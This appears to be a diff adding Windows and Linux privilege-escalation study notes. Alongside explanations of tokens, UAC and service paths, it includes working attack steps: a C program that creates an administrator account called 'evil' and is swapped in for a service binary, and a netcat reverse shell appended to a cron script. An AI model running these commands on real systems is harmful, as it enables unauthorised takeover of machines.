@@ -67,5 +67,111 @@ lsmod
 /sbin/modinfo libata
 find / -perm -u=s -type f 2>/dev/null
 
+=========================================================================================================
+WIN PRIV ESC
 
+privileges use access tokens with SID (https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
+those are maintained by the Windows Local Security Authority
+
+integrity mechanism - integiry levels to apps, processes and securable objects (what can those apps/proc/etc do)
+system rights
+high integrity - administrative rights
+medium - standard user rights
+low - restricted user in sandboxed processes
+
+UAC - user account control - forces apps and tasks to run in the context of a non-admin account until admin authorizes elevated access
+has credential prompt / consent prompt
+
+
+by default admin has 2 integrity tokens medium and admin and runs on medium by default
+whoami /groups
+
+to change to admin integrity for example
+powershell.exe Start-Process cmd.exe -Verb runAs
+==============
+UAC bypass
+example - fodhelper.exe
+==============
+Insecure File Permissions - exploit on services that run as nt authority\system
+
+Software developer creates a program that runs as a Windows service.
+During the installation, the developer does not secure the permissions of the program,
+allowing full read and write access to all members of the Everyone group.
+As a result, a lower-privileged user could replace the program with a malicious one.
+
+list running services
+Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
+
+enum permissions of targeted service
+
+icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
+
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user evil Ev!lpass /add");
+  i = system ("net localgroup administrators evil /add");
+  
+  return 0;
+}
+
+compile above code
+i686-w64-mingw32-gcc adduser.c -o adduser.exe
+
+move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"
+net stop Serviio
+
+wmic service where caption="Serviio" get name, caption, state, startmode
+
+if automatic restart - shuti down the machine to restart the service
+shutdown /r /t 0
+
+after reboot check users
+net localgroup Administrators
+==============
+Unquoted Service Paths
+
+For example, imagine that we have a service stored in a path such as C:\Program Files\My Program\My Service\service.exe.
+If the service path is stored unquoted, whenever Windows starts the service it will attempt to run an executable from the following paths:
+
+C:\Program.exe
+C:\Program Files\My.exe
+C:\Program Files\My Program\My.exe
+C:\Program Files\My Program\My service\service.exe
+==============
+Windows Kernel Vulnerabilities
+
+enum drivers
+driverquery /v
+
+searchsploit <drivername>
+
+=========================================================================================================
+LINUX PRIV ESC
+Insecure File Permissions
+
+CRON
+grep "CRON" /var/log/cron.log
+
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1.2.3.4 1234 >/tmp/f" >> cron_script.sh
+nc -lnvp 1234
+
+/etc/passwd
+For backwards compatibility, if a password hash is present in the second column of a /etc/passwd user record,
+it is considered valid for authentication and it takes precedence over the respective entry in /etc/shadow if available.
+
+==============
+Kernel Vuln
+
+gather info about target OS
+/etc/issue
+uname -r
+arch
+
+searchsploit linux kernel ubuntu 16.03
+
+gcc 12345.c -o exploit
 
